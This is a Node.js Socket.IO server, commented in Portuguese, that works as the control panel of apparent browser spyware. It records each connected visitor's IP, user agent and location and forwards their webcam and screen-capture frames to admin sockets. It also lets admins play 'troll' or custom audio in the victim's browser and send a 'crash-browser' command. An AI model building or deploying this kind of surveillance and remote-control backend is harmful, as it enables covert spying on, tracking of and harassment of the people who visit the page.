const express  = require('express');
const http     = require('http');
const path     = require('path');
const { Server } = require('socket.io');
const { v4: uuid } = require('uuid');

const app    = express();
const server = http.createServer(app);
const io     = new Server(server);

app.use(express.static(path.join(__dirname,'public')));

const clients = new Map();

io.on('connection', socket=>{
  const role = socket.handshake.query.role;

  /* ---------- CLIENTE ---------- */
  if(role==='client'){
    const id  = uuid();
    const ip  = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    const ua  = socket.handshake.headers['user-agent'] || 'desconhecido';

    clients.set(id,{ uuid:id, ip, ua, connected_at:Date.now(),
                     socket, watchers:[], screenWatchers:[] });     // <<

    socket.emit('id',id);
    broadcastClients();

    socket.on('frame',dataURL=>{
      const c = clients.get(id);
      if(c) c.watchers.forEach(w=>io.to(w).emit('frame',{id,data:dataURL}));
    });

    /* NOVO: frames de tela */
    socket.on('screen-frame',dataURL=>{                                   // <<
      const c = clients.get(id);                                          // <<
      if(c) c.screenWatchers.forEach(w=>io.to(w).emit('screen-frame',{    // <<
          id,data:dataURL}));                                             // <<
    });                                                                   // <<

    socket.on('location',loc=>{
      const c=clients.get(id);
      if(c){ c.location=loc; broadcastLocation(id,loc); }
    });

    socket.on('disconnect',()=>{
      clients.delete(id); broadcastClients();
    });
  }

  /* ---------- ADMIN ---------- */
  if(role==='admin'){
    socket.emit('clients', summary());

    socket.on('request-stream', uuid=>{
      const c=clients.get(uuid);
      if(c && !c.watchers.includes(socket.id)) c.watchers.push(socket.id);
    });
    socket.on('stop-stream', uuid=>{
      const c=clients.get(uuid);
      if(c) c.watchers = c.watchers.filter(x=>x!==socket.id);
    });

    /* NOVO: pedir / parar tela */
    socket.on('request-screen', uuid=>{                                   // <<
      const c=clients.get(uuid);                                          // <<
      if(c && !c.screenWatchers.includes(socket.id))                      // <<
           c.screenWatchers.push(socket.id);                              // <<
    });                                                                   // <<
    socket.on('stop-screen', uuid=>{                                      // <<
      const c=clients.get(uuid);                                          // <<
      if(c) c.screenWatchers = c.screenWatchers.filter(x=>x!==socket.id); // <<
    });                                                                   // <<

    
    /* áudio (igual) */
    socket.on('troll-audio', uuid=>{
      const c=clients.get(uuid);
      if(c) c.socket.emit('play-audio',{ url:'https://actions.google.com/sounds/v1/ambiences/subway_station_nyc.ogg' });
    });
    socket.on('custom-audio',({uuid,dataURL})=>{
      const c=clients.get(uuid);
      if(c) c.socket.emit('play-audio',{url:dataURL});
    });
    socket.on('stop-audio', uuid=>{
      const c=clients.get(uuid);
      if(c) c.socket.emit('stop-audio');
    });

    socket.on('crash-browser', uuid => {
   const c = clients.get(uuid);
   if (c) c.socket.emit('crash-browser');
 });

    socket.on('disconnect',()=>{
      for(const c of clients.values()){
        c.watchers       = c.watchers.filter(x=>x!==socket.id);
        c.screenWatchers = c.screenWatchers.filter(x=>x!==socket.id);     // <<
      }
    });
  }
});

/* utilidades */
function summary(){
  return Array.from(clients.values()).map(c=>({
    uuid:c.uuid, ip:c.ip, ua:c.ua,
    connected_at:c.connected_at, location:c.location
  }));
}
function broadcastClients(){
  const list=summary();
  for(const s of io.sockets.sockets.values())
    if(s.handshake.query.role==='admin') s.emit('clients',list);
}
function broadcastLocation(uuid,loc){
  for(const s of io.sockets.sockets.values())
    if(s.handshake.query.role==='admin') s.emit('location-update',{uuid,loc});
}

server.listen(3000,()=>console.log('✔ http://localhost:3000'));
